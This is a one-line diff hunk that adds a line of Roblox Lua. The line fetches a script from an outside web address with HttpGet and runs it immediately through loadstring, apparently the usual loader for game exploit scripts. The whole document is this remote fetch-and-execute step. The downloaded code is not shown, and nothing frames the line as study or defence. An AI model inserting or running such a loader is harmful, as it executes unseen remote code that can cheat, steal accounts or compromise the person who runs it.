@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawz.vercel.app/cac.tuff"))()
